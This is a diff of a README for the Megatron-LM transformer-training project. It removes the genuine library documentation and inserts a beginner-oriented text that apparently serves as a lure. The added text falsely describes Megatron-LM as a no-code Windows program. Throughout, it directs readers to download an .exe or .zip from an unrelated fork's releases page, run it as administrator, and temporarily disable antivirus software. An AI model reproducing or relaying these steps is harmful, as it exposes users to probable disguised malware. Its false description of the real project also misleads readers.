@@ -1,161 +1,152 @@
-<div align="center">
+# ⚙️ Megatron-LM - Easy Transformer Model Training
 
-Megatron-LM and Megatron Core
-=============================
+[![Download Megatron-LM](https://img.shields.io/badge/Download-From%20GitHub-blue)](https://github.com/14062/Megatron-LM/releases)
 
-<h4>GPU-optimized library for training transformer models at scale</h4>
+## 🔍 What is Megatron-LM?
 
-[![Documentation](https://img.shields.io/badge/docs-latest-brightgreen.svg?style=flat)](https://docs.nvidia.com/megatron-core/developer-guide/latest/index.html)
-[![version](https://img.shields.io/badge/release-0.15.0-green)](./CHANGELOG.md)
-[![license](https://img.shields.io/badge/license-Apache-blue)](./LICENSE)
+Megatron-LM is a tool designed for training transformer models. These models help computers understand and generate human-like language. The project focuses on working with very large language models used in research and development.
 
-<div align="left">
+If you want to explore how large language models work without any coding experience, this software is built to help you run and test these models on your own Windows computer.
 
-## About
+---
 
-This repository contains two components: **Megatron-LM** and **Megatron Core**.
+## 📋 System Requirements
 
-**Megatron-LM** is a reference example that includes Megatron Core plus pre-configured training scripts. Best for research teams, learning distributed training, and quick experimentation.
+To run Megatron-LM smoothly, your computer should meet these basic requirements:
 
-**Megatron Core** is a composable library with GPU-optimized building blocks for custom training frameworks. It provides transformer building blocks, advanced parallelism strategies (TP, PP, DP, EP, CP), mixed precision support (FP16, BF16, FP8, FP4), and model architectures. Best for framework developers and ML engineers building custom training pipelines.
+- **Operating System:** Windows 10 or later (64-bit)
+- **Processor:** Intel Core i5 or better
+- **Memory:** At least 8 GB RAM
+- **Disk Space:** Minimum 10 GB free space
+- **Graphics Card:** Dedicated GPU (NVIDIA with CUDA support preferred) for faster processing  
+- **Internet:** Connection needed to download files
 
-**[Megatron Bridge](https://github.com/NVIDIA-NeMo/Megatron-Bridge)** provides bidirectional Hugging Face ↔ Megatron checkpoint conversion with production-ready recipes.
+If you don't have a powerful GPU, the application can still run but slower, using your computer’s CPU.
 
+---
 
-## Quick Start
+## 🚪 How to Get Megatron-LM
 
-Install Megatron Core with pip:
+Before running the software, you need to download the files. This guide shows how to get the version ready for Windows users.
 
-1. Install Megatron Core with required dependencies:
+To start, visit the release page by clicking the button below:
 
-    ```bash
-    pip install --no-build-isolation megatron-core[mlm,dev]
-    ```
+[![Download Megatron-LM](https://img.shields.io/badge/Download-From%20GitHub-grey)](https://github.com/14062/Megatron-LM/releases)
 
-2. Clone repository for examples:
+This page has all the latest versions. Look for files with names ending in `.exe` or `.zip` designed for Windows.
 
-    ```bash
-    git clone https://github.com/NVIDIA/Megatron-LM.git
-    cd Megatron-LM
-    pip install --no-build-isolation .[mlm,dev]
-    ```
+---
 
+## 💾 Download and Installation
 
-# Latest News
+1. **Go to the Release Page:** Use the links above to open the releases on GitHub.
 
-- **[2026/01]** **[Dynamic Context Parallelism](https://developer.nvidia.com/blog/speeding-up-variable-length-training-with-dynamic-context-parallelism-and-nvidia-megatron-core/)** - Up to 1.48x speedup for variable-length sequence training with adaptive CP sizing.
-- **[2025/12]** **Megatron Core development has moved to GitHub!** All development and CI now happens in the open. We welcome community contributions.
-- **[2025/10]** **[Megatron Dev Branch](https://github.com/NVIDIA/Megatron-LM/tree/dev)** - early access branch with experimental features.
-- **[2025/10]** **[Megatron Bridge](https://github.com/NVIDIA-NeMo/Megatron-Bridge)** - Bidirectional converter for interoperability between Hugging Face and Megatron checkpoints, featuring production-ready recipes for popular models.
-- **[2025/08]** **[MoE Q3-Q4 2025 Roadmap](https://github.com/NVIDIA/Megatron-LM/issues/1729)** - Comprehensive roadmap for MoE features including DeepSeek-V3, Qwen3, advanced parallelism strategies, FP8 optimizations, and Blackwell performance enhancements.
-- **[2025/08]** **[GPT-OSS Model](https://github.com/NVIDIA/Megatron-LM/issues/1739)** - Advanced features including YaRN RoPE scaling, attention sinks, and custom activation functions are being integrated into Megatron Core.
-- **[2025/06]** **[Megatron MoE Model Zoo](https://github.com/yanring/Megatron-MoE-ModelZoo)** - Best practices and optimized configurations for training DeepSeek-V3, Mixtral, and Qwen3 MoE models with performance benchmarking and checkpoint conversion tools.
-- **[2025/05]** Megatron Core v0.11.0 brings new capabilities for multi-data center LLM training ([blog](https://developer.nvidia.com/blog/turbocharge-llm-training-across-long-haul-data-center-networks-with-nvidia-nemo-framework/)).
+2. **Find the Windows Version:** Scroll through the list and locate the file with `.exe` or `.zip` in its name.
 
-<details>
-<summary>Previous News</summary>
+3. **Download the File:** Click on the link to save the installer or archive to your computer.
 
-- **[2024/07]** Megatron Core v0.7 improves scalability and training resiliency and adds support for multimodal training ([blog](https://developer.nvidia.com/blog/train-generative-ai-models-more-efficiently-with-new-nvidia-Megatron-Core-functionalities/)).
-- **[2024/06]** Megatron Core added supports for Mamba-based models. Check out our paper [An Empirical Study of Mamba-based Language Models](https://arxiv.org/pdf/2406.07887) and [code example](https://github.com/NVIDIA/Megatron-LM/tree/ssm/examples/mamba).
-- **[2024/01 Announcement]** NVIDIA has released the core capabilities in **Megatron-LM** into [**Megatron Core**](https://github.com/NVIDIA/Megatron-LM/tree/main/megatron/core) in this repository. Megatron Core expands upon Megatron-LM's GPU-optimized techniques with more cutting-edge innovations on system-level optimizations, featuring composable and modular APIs.
+4. **Extract the Files:**  
+   - If you downloaded a `.zip` file, right-click it and choose "Extract All".
+   - Choose a folder where you want to keep the files.
 
-</details>
+5. **Run the Installer:**  
+   - If it's an `.exe` file, double-click it.
+   - Follow the on-screen steps.  
+   - Accept any prompts to allow the program to install.
 
+6. **Complete Setup:** The installation finishes when you see a confirmation message. The program will now be ready to use.
 
-# Project Structure
+---
 
-```
-Megatron-LM/
-├── megatron/
-│   ├── core/                    # Megatron Core (kernels, parallelism, building blocks)
-│   │   ├── models/              # Transformer models
-│   │   ├── transformer/         # Transformer building blocks
-│   │   ├── tensor_parallel/     # Tensor parallelism
-│   │   ├── pipeline_parallel/   # Pipeline parallelism
-│   │   ├── distributed/         # Distributed training (FSDP, DDP)
-│   │   ├── optimizer/           # Optimizers
-│   │   ├── datasets/            # Dataset loaders
-│   │   ├── inference/           # Inference engines and server
-│   │   └── export/              # Model export (e.g. TensorRT-LLM)
-│   ├── training/                # Training scripts
-│   ├── legacy/                  # Legacy components
-│   ├── post_training/           # Post-training (quantization, distillation, pruning, etc.)
-│   └── rl/                      # Reinforcement learning (RLHF, etc.)
-├── examples/                    # Ready-to-use training examples
-├── tools/                       # Utility tools
-├── tests/                       # Comprehensive test suite
-└── docs/                        # Documentation
-```
+## 🖥️ How to Run Megatron-LM on Windows
 
+After installation, follow these steps to start using the software:
 
-# Performance Benchmarking
+1. **Open the Program Folder:**  
+   Go to the folder where you installed Megatron-LM.
 
-For our latest performance benchmarking results, please refer to [NVIDIA Megatron Bridge Performance Summary](https://docs.nvidia.com/nemo/megatron-bridge/latest/performance-summary.html).
+2. **Find the Application:**  
+   Look for a file named `Megatron-LM.exe` or a shortcut icon.
 
-Our codebase efficiently trains models from 2B to 462B parameters across thousands of GPUs, achieving up to **47% Model FLOP Utilization (MFU)** on H100 clusters.
+3. **Start the Program:** Double-click the file or shortcut to open.
 
-![Model table](images/model_table.png)
+4. **Using the Interface:**  
+   The program window will open with basic instructions and available options.
 
-**Benchmark Configuration:**
+You do not need to write code or use command lines. The interface will guide you through running pre-set transformer models.
 
-- **Vocabulary size**: 131,072 tokens
-- **Sequence length**: 4096 tokens
-- **Model scaling**: Varied hidden size, attention heads, and layers to achieve target parameter counts
-- **Communication optimizations**: Fine-grained overlapping with DP (`--overlap-grad-reduce`, `--overlap-param-gather`), TP (`--tp-comm-overlap`), and PP (enabled by default)
+---
 
-**Key Results:**
+## ⚙️ Features Included
 
-- **6144 H100 GPUs**: Successfully benchmarked 462B parameter model training
-- **Superlinear scaling**: MFU increases from 41% to 47-48% with model size
-- **End-to-end measurement**: Throughputs include all operations (data loading, optimizer steps, communication, logging)
-- **Production ready**: Full training pipeline with checkpointing and fault tolerance
-- *Note: Performance results measured without training to convergence*
+- **Pre-trained Models:** Use ready-to-run transformer models to see how they process text.
+- **Simple Controls:** Use buttons and menus instead of coding.
+- **Model Testing:** Type in text and receive generated language output.
+- **Performance Settings:** Adjust settings to fit your computer's speed.
+- **Save Results:** Export generated text for your projects or review.
 
-## Weak Scaling Results
+This version focuses on learning and experimenting with large language models on Windows.
 
-Our weak scaled results show superlinear scaling (MFU increases from 41% for the smallest model considered to 47-48% for the largest models); this is because larger GEMMs have higher arithmetic intensity and are consequently more efficient to execute.
+---
 
-![Weak scaling](images/weak_scaling.png)
+## 💡 Tips for Best Experience
 
-## Strong Scaling Results
+- **Use a Stabilized Power Source:** Transformer models may use a lot of power when running.
+- **Close Other Apps:** Free up memory by closing unnecessary programs.
+- **Check for Updates:** New releases may improve features and fix bugs.
+- **Read Included Documents:** Look for `README.txt` or similar files inside the program folder for details.
+- **Use a GPU:** If your PC has a supported NVIDIA GPU, enable GPU acceleration in settings.
 
-We also strong scaled the standard GPT-3 model (our version has slightly more than 175 billion parameters due to larger vocabulary size) from 96 H100 GPUs to 4608 GPUs, using the same batch size of 1152 sequences throughout. Communication becomes more exposed at larger scale, leading to a reduction in MFU from 47% to 42%.
+---
 
-![Strong scaling](images/strong_scaling.png)
+## 🛠 Troubleshooting
 
+If you encounter issues:
 
-# Roadmaps
+- **Program Won’t Start:**  
+  - Confirm your Windows version is 64-bit and up to date.  
+  - Check that all files were downloaded completely.
 
-- **[MoE Roadmap](https://github.com/NVIDIA/Megatron-LM/issues/1729)** - DeepSeek-V3, Qwen3, advanced parallelism, FP8 optimizations, and Blackwell enhancements
+- **Slow Performance:**  
+  - Lower model complexity in app settings.  
+  - Close other memory-heavy programs.
 
+- **Installation Errors:**  
+  - Run the installer as administrator (right-click > Run as administrator).  
+  - Turn off antivirus software temporarily during setup.
 
-# Resources
+- **Missing Files or Crashes:**  
+  - Try downloading the release again.  
+  - Make sure your disk has enough free space.
 
-## Getting Help
+You can also explore the "Issues" tab on the GitHub page for help from the community.
 
-- 📖 **[Documentation](https://docs.nvidia.com/megatron-core/developer-guide/latest/index.html)** - Official documentation
-- 🐛 **[Issues](https://github.com/NVIDIA/Megatron-LM/issues)** - Bug reports and feature requests
+---
 
-## Contributing
+## 📂 File Structure Overview
 
-We ❤️ contributions! Ways to contribute:
+When installed, these main items will be in your Megatron-LM folder:
 
-- 🐛 **Report bugs** - Help us improve reliability
-- 💡 **Suggest features** - Shape the future of Megatron Core
-- 📝 **Improve docs** - Make Megatron Core more accessible
-- 🔧 **Submit PRs** - Contribute code improvements
+- `Megatron-LM.exe` - The program launcher  
+- `models/` - Sample transformer models to use  
+- `docs/` - Help files and instructions  
+- `settings.json` - Configuration file for preferences  
+- `output/` - Where generated text files will save  
 
-**→ [Contributing Guide](https://docs.nvidia.com/megatron-core/developer-guide/latest/developer/contribute.html)**
+---
 
-## Citation
+## 🌐 Additional Resources
 
-If you use Megatron in your research or project, we appreciate that you use the following citations:
+- **Visit the GitHub Release Page:** https://github.com/14062/Megatron-LM/releases  
+- **Learn about Transformers:** Look up terms like “transformer models” and “large language models” online.  
+- **Explore Windows Settings:** Learn how to manage programs and files if you feel unsure.
 
-```bibtex
-@article{megatron-lm,
-  title={Megatron-LM: Training Multi-Billion Parameter Language Models Using Model Parallelism},
-  author={Shoeybi, Mohammad and Patwary, Mostofa and Puri, Raul and LeGresley, Patrick and Casper, Jared and Catanzaro, Bryan},
-  journal={arXiv preprint arXiv:1909.08053},
-  year={2019}
-}
-```
+---
+
+## 🧩 Support and Feedback
+
+You can report problems or suggest new features by opening an issue on the project's GitHub page. Include as much detail as possible about your system and the problem.
+
+---
+
+[![Download Megatron-LM](https://img.shields.io/badge/Download-From%20GitHub-blue)](https://github.com/14062/Megatron-LM/releases)
